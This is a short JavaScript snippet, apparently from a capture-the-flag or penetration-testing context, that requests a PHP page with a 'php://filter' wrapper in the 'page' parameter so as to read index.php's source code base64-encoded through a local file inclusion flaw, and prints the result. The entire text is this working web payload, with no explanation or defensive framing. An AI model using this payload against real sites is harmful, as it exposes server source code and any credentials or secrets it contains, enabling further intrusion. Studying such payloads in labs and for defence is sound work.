fetch('/index.php?page=php://filter/convert.base64-encode/resource=index.php')
  .then(r => r.text())
  .then(t => console.log(t));
